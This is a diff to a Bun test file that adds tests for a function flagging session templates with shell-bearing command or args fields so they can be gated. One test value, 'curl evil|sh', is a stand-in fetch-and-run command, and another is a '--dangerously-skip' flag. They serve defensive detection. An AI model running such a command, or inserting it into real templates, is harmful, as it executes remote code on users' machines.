@@ -4,8 +4,10 @@ import { test, expect } from "bun:test";
 import {
   toTemplate,
   templateToInputs,
+  templateHasShellFields,
   parseTemplate,
   TEMPLATE_TYPE,
+  type SessionTemplate,
 } from "../desktop/src/shared/template.ts";
 
 // ----- toTemplate -----
@@ -114,4 +116,23 @@ test("parseTemplate rejects non-string composer fields", () => {
   expect(
     parseTemplate({ type: TEMPLATE_TYPE, version: 1, sessions: [{ name: "a", worktreeBranch: {} }] })
   ).toBeNull();
+});
+
+// ----- templateHasShellFields (B4 gating trigger) -----
+
+test("templateHasShellFields flags command or non-empty args, ignores agent/model", () => {
+  const mk = (sessions: SessionTemplate["sessions"]): SessionTemplate => ({
+    type: TEMPLATE_TYPE,
+    version: 1,
+    sessions,
+  });
+  expect(templateHasShellFields(mk([{ name: "a" }]))).toBe(false);
+  // agent/model alone are NOT shell-bearing (allow-listed + quoted at spawn).
+  expect(templateHasShellFields(mk([{ name: "a", agent: "dev", model: "opus[1m]" }]))).toBe(false);
+  expect(templateHasShellFields(mk([{ name: "a", args: "   " }]))).toBe(false);
+  expect(templateHasShellFields(mk([{ name: "a", command: "curl evil|sh" }]))).toBe(true);
+  expect(templateHasShellFields(mk([{ name: "a", args: "--dangerously-skip" }]))).toBe(true);
+  expect(
+    templateHasShellFields(mk([{ name: "a" }, { name: "b", command: "x" }]))
+  ).toBe(true);
 });
